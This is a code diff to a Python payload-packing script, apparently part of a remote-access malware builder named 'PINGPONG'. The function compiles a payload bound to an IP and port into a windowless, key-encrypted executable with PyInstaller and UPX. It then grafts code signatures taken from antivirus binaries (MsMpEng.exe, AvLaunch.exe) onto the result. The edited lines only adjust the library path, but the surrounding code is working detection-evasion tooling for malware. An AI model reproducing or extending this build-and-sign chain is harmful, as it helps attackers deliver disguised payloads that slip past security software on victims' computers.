@@ -7,6 +7,7 @@ from os.path import isfile, isdir, abspath, dirname, sep
 from shutil import move, rmtree
 from sys import path
 from random import randint
+install_path = path[4]
 path.append("..")
 import main
 def generate_random_str(randomlength=16):
@@ -25,7 +26,8 @@ def pack(payload, ip, port, printf, upx_command):
 		upx_command = "--upx-dir " + upx_command
 	else:
 		main.print_warn("payload>[!]TO MAKE THE PAYLOAD SMALLER, YOU'D BETTER INSTALL UPX AT https://upx.github.io/")
-	command = f"pyinstaller {upx_command} -F payload/payload.py --key {key} -w"
+	print(f"{install_path}/Lib/site-packages")
+	command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/payload.py {upx_command} --key {key} -w"
 	command_sign_1 = f"python {father_path}/sign.py -i {father_path}/sign_sample/MsMpEng.exe -t {father_path}/upload_payload/PINGPONG_payload.exe -o {father_path}/upload_payload/PINGPONG_payload_sign.exe"
 	command_sign_2 = f"python {father_path}/sign.py -i {father_path}/sign_sample/AvLaunch.exe -t {father_path}/upload_payload/PINGPONG_payload.exe -o {father_path}/upload_payload/PINGPONG_payload_sign_twice.exe"
 	if printf:
